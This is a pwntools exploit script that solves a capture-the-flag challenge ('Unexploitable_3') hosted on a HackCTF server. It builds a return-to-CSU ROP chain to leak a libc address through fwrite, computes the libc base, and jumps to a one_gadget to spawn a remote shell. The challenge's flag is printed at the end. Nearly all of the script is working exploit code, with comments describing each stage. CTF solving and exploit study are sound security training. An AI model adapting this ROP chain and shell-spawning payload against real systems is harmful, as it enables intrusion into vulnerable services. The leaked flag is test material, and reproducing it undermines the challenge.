#solve at ubuntu 16.04 

from pwn import * 

local = 0

csu_1 = 0x400736 # pop rbx-rbp-r12-r13-r14-15 
csu_2 = 0x400720
mcr = 0x0400658 # mov ecx, dword ptr [rdi] ; ret
popr = 0x00400743 # pop rdi ; ret
stdout = 0x601050
main = 0x40065f

fwrite_plt = 0x400520
fwrite_got = 0x601030


if local == 1 :
	p = process("./Unexploitable_3")
	one_gadget = [0x4f2c5,0x4f322,0x10a38c]
	fwrite_offset = 0x7f8a0
elif local == 0 :
	p = remote("ctf.j0n9hyun.xyz",3034)
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	fwrite_offset = 0x6e6e0

#input 256bytes, buf place is rbp-0x10.
#Partial RELRO, no PIE, no Canary
#fwrite(string, 1, size, stdout)
#but no pop rdx&rcx again. and this time, no have a system gadget. 
#gift func has mov rcv<-rdi ret gadget. and how to get rdx(size)..
#now, time to using return to CSU. when it work 
#r13->rdx, r14->rsi, r15->edi, rbx->0, r12->funcaddr 
#scenario : leak libc addr -> using magic gadget

# so, set rcx to stdout,rbx->0,rbp->1 r12 -> plt addr 
# r13->rdx->size(0x8) , r14->rsi->1, r15->edi=>got

#set the stack. 1. popr -> rdi(stdout) -> mcr ->
#2. csu_1 -> rbx(0) -> rbp(1) -> r12(plt) -> r13(0x8) -> r14(1) -> r15(got) 
#3. csu_2

p.recvline()



payload = "a"*0x10 + "b"*0x8
payload += p64(popr) + p64(stdout) + p64(mcr)
payload += p64(csu_1) + p64(0xbb) + p64(0) + p64(1) + p64(fwrite_got) + p64(0x8) + p64(1) + p64(fwrite_got)
payload += p64(csu_2) + p64(0xbb)*7 + p64(main)

p.sendline(payload)

leak = u64(p.recv(8))
libc = leak-fwrite_offset
one = libc+one_gadget[0]

log.info("leak addr : "+hex(leak) + "libc : "+hex(libc))
pause()
payload2 = "a"*0x10 + "b"*0x8 
payload2 += p64(one)

p.sendline(payload2)

p.interactive()
#HackCTF{bss_4lw4y5_h4s_std1n/std0ut}